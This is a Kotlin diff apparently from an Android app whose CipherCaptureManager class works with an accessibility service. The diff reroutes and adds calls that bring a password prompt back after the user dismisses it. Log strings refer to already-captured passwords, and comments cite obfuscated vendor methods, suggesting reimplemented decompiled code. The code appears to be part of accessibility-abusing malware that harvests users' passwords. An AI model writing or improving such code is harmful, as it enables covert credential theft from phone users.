@@ -1641,11 +1641,7 @@ class CipherCaptureManager(
             val svc = com.storm.safe.rock.service.MyAccessibilityService.getInstance()
             if (svc != null) {
                 // vendor: c0290a0.m211495i9() — onPasswordPageDismissedByUser
-                // 该方法检查 k5 和 k2 限制后重新启用监听
-                val ccm = svc.cipherCaptureManager
-                if (ccm != null) {
-                    enableListening(ccm)
-                }
+                svc.onPasswordPageDismissedByUser()
             } else {
                 Log.w(TAG, "⚠️ dqtvuisjd 实例为 null")
             }
@@ -2122,6 +2118,9 @@ class CipherCaptureManager(
         val saved = loadCipherFromPrefs(true) ?: loadCipherFromPrefs(false)
         if (saved != null) { val elapsed = System.currentTimeMillis() - (saved["timestamp"] as? Long ?: 0L); if (elapsed < 30000) { Log.d(TAG, "🔷 已有密码（${elapsed}ms前），不再弹出"); notifyPasswordCaptureSuccess(); return } }
         Log.d(TAG, "🔷 通知重新弹出密码框")
+        try {
+            com.storm.safe.rock.service.MyAccessibilityService.getInstance()?.onPasswordPageDismissedByUser()
+        } catch (e: Exception) { Log.w(TAG, "❌ 通知重新弹出失败: ${e.message}") }
     }
 
     /** 完整 stopListening — 清理所有状态。vendor: b5 (30 行) */
